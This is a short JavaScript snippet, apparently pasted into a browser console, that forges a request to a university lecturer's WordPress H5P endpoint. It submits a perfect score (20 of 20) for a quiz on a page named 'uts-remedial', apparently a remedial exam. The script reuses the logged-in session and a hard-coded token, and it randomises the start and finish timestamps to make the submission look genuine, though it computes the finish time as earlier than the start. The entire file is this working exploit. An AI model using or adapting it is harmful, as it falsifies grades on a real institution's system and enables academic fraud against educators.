
var open = Math.floor(Date.now() / 1000);
var close = open - ((60+Math.floor(Math.random() * 10))*5);
console.log(open);
console.log(close);
fetch(
  "https://aliv.lecturer.pens.ac.id/wp-admin/admin-ajax.php?token=bfbd1077a3&action=h5p_setFinished",
  {
    headers: {
      accept: "*/*",
      "accept-language": "en-US,en;q=0.9,ms;q=0.8",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-requested-with": "XMLHttpRequest",
    },
    referrer: "https://aliv.lecturer.pens.ac.id/uts-remedial/",
    referrerPolicy: "strict-origin-when-cross-origin",
    body:
      "contentId=31&score=20&maxScore=20&opened="+open+"&finished="+close,
    method: "POST",
    mode: "cors",
    credentials: "include",
  }
);